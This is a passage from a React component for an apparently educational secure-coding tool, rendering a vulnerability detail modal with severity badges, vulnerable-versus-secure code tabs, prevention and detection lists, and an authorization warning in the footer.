                {copiedHeader ? <CheckCircle2 size={16} style={{ color: "#00ff9d" }} /> : <Copy size={16} />}
                <span>{copiedHeader ? "Copied!" : "Copy Configuration"}</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Detail Modal Component */}
      {selectedVulnModal && (
        <div className="skh-modal-overlay" onClick={() => setSelectedVulnModal(null)}>
          <div className="skh-modal" onClick={(e) => e.stopPropagation()}>
            <div className="skh-modal-accent" style={{ backgroundColor: selectedVulnModal.severity === "Critical" ? "#f87171" : selectedVulnModal.severity === "High" ? "#fb923c" : "#fbbf24" }} />
            
            <div className="skh-modal-header">
              <div className="skh-modal-title-group">
                <h2>{selectedVulnModal.name}</h2>
                <p>{selectedVulnModal.category} • {selectedVulnModal.owasp}</p>
              </div>
              <button className="skh-modal-close" onClick={() => setSelectedVulnModal(null)}>
                <X size={18} />
              </button>
            </div>

            <div className="skh-modal-badges">
              <span className={`skh-sev-badge ${selectedVulnModal.severity === "Critical" ? "skh-sev-critical" : selectedVulnModal.severity === "High" ? "skh-sev-high" : selectedVulnModal.severity === "Medium" ? "skh-sev-medium" : "skh-sev-low"}`}>
                {selectedVulnModal.severity} Severity
              </span>
              <span className={`skh-diff-badge ${selectedVulnModal.difficulty === "Beginner" ? "skh-diff-beginner" : selectedVulnModal.difficulty === "Intermediate" ? "skh-diff-intermediate" : "skh-diff-advanced"}`}>
                {selectedVulnModal.difficulty} Level
              </span>
            </div>

            <div className="skh-modal-body">
              {/* Overview */}
              <div className="skh-modal-section">
                <h3>Vulnerability Overview</h3>
                <p>{selectedVulnModal.attackExplanation}</p>
              </div>

              {/* Impact Analysis */}
              <div className="skh-modal-section">
                <h3>Impact Analysis</h3>
                <p style={{ color: "#fca5a5" }}>{selectedVulnModal.impactAnalysis}</p>
              </div>

              {/* Side-by-Side Code Comparison */}
              <div className="skh-modal-section">
                <h3>Code Comparison Matrix</h3>
                <div className="skh-lang-tabs">
                  {Object.keys(selectedVulnModal.languages).map((lang) => (
                    <button
                      key={lang}
                      className={`skh-lang-btn ${activeCodeLang === lang ? "active" : ""}`}
                      onClick={() => setActiveCodeLang(lang)}
                    >
                      {lang.toUpperCase()}
                    </button>
                  ))}
                </div>

                {selectedVulnModal.languages[activeCodeLang] ? (
                  <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                    <div className="skh-code-compare">
                      {/* Vulnerable Code block */}
                      <div className="skh-code-panel vuln">
                        <div className="skh-code-panel-header">
                          <span>❌ Vulnerable Code</span>
                          <button className="skh-code-copy" onClick={() => handleCopyCode(selectedVulnModal.languages[activeCodeLang].vuln, 'vuln')}>
                            {copiedCodeId === 'vuln' ? <Check size={12} /> : <Copy size={12} />}
                            <span>{copiedCodeId === 'vuln' ? "Copied" : "Copy"}</span>
                          </button>
                        </div>
                        <pre className="skh-code-block">{selectedVulnModal.languages[activeCodeLang].vuln}</pre>
                      </div>

                      {/* Secure Code block */}
                      <div className="skh-code-panel secure">
                        <div className="skh-code-panel-header">
                          <span>✅ Secure Code</span>
                          <button className="skh-code-copy" onClick={() => handleCopyCode(selectedVulnModal.languages[activeCodeLang].secure, 'sec')}>
                            {copiedCodeId === 'sec' ? <Check size={12} /> : <Copy size={12} />}
                            <span>{copiedCodeId === 'sec' ? "Copied" : "Copy"}</span>
                          </button>
                        </div>
                        <pre className="skh-code-block">{selectedVulnModal.languages[activeCodeLang].secure}</pre>
                      </div>
                    </div>
                    
                    <div style={{ background: "rgba(255,255,255,0.03)", padding: 12, borderRadius: 8, border: "1px solid rgba(255,255,255,0.06)", fontSize: "0.85rem", color: "rgba(224,250,255,0.7)", display: "flex", gap: 8, alignItems: "flex-start" }}>
                      <Info size={16} style={{ color: "#00f2ff", flexShrink: 0, marginTop: 2 }} />
                      <p style={{ margin: 0 }}>{selectedVulnModal.languages[activeCodeLang].explanation}</p>
                    </div>
                  </div>
                ) : (
                  <p style={{ color: "rgba(224,250,255,0.4)", fontSize: "0.85rem" }}>No code comparison examples available for this language.</p>
                )}
              </div>

              {/* Prevention & Remediation */}
              <div className="skh-modal-grid">
                <div className="skh-modal-section">
                  <h3>Prevention Techniques</h3>
                  <ul>
                    {selectedVulnModal.preventionTechniques.map((item, idx) => (
                      <li key={idx}>{item}</li>
                    ))}
                  </ul>
                </div>

                <div className="skh-modal-section">
                  <h3>Detection Methods</h3>
                  <ul>
                    {selectedVulnModal.detectionMethods.map((item, idx) => (
                      <li key={idx}>{item}</li>
                    ))}
                  </ul>
                </div>
              </div>

              {/* Best Practices */}
              <div className="skh-modal-section">
                <h3>Best Practices</h3>
                <ul>
                  {selectedVulnModal.bestPractices.map((item, idx) => (
                    <li key={idx}>{item}</li>
                  ))}
                </ul>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Footer warning */}
      <div className="skh-footer">
        <Shield size={16} />
        <span>Educational purposes only. Always obtain authorization before security testing any system or source code.</span>
      </div>
    </div>
  );
}
